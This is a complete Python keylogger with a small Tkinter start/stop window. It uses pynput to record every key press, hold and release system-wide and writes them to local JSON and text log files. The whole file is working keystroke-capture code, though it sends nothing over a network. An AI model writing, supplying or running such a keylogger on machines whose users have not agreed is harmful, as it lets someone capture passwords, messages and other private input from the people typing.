from __future__ import annotations

import sys
from tkinter import CENTER as _CENTER
from tkinter import RIGHT as _RIGHT
from tkinter import LEFT as _LEFT

from tkinter import Tk as _Tk

from tkinter import Button as _Button
from tkinter import Label as _Label
from pynput import keyboard as _keyboard
from typing import Any as _Any
from datetime import datetime as _dt

from json import dumps as _dumps

key_used: list | None = []
flag: bool = False
keys: str = ''
now: _dt = _dt.now()


def generate_text_log(key: _Any):
    with open('./out/key_log.txt', "w+") as KEYs:
        KEYs.write(key)


def generate_json_file(used_keys: _Any):
    with open('./out/key_log.json', "+wb") as key_log:
        keys_list_bytes = _dumps(list(used_keys)).encode()
        key_log.write(keys_list_bytes)


def on_press(key: _Any):
    global flag, key_used, keys
    if not flag:
        key_used.append({"Pressed:": f"{key}"})
        flag = True
    if flag:
        key_used.append({"Held": f"{key}"})
    generate_json_file(key_used)


def on_release(key: _Any):
    global flag, key_used, keys
    key_used.append({"Released":f"{key}"})
    if flag:
        flag = False
    generate_json_file(key_used)
    keys = keys + str(key)
    generate_text_log(str(keys))


_Listner = _keyboard.Listener(on_press=on_press, on_release=on_release)


def start_keylogger():
    listner = _Listner
    listner.start()
    label.config(text="[❤] Keylogger is running!\n Saving the keys!")
    start_button.config(state="disabled")
    stop_button.config(state="normal")


def stop_keylogger():
    listner = _Listner
    listner.stop()
    label.config(text="[💥] Keylogger is stopped!\n Not saving the keys!")
    start_button.config(state="normal")
    stop_button.config(state="disabled")


if __name__ == "__main__":
    root = _Tk()
    root.title("Keylogger")

    label = _Label(root, text="Click 'start' to begin key logging...")
    label.config(anchor=_CENTER)
    label.pack()

    start_button = _Button(root, text="Start", command=start_keylogger)
    start_button.pack(side=_LEFT)

    stop_button = _Button(root, text="Stop", command=stop_keylogger)
    stop_button.pack(side=_RIGHT)

    root.geometry("250x250")
    root.mainloop()
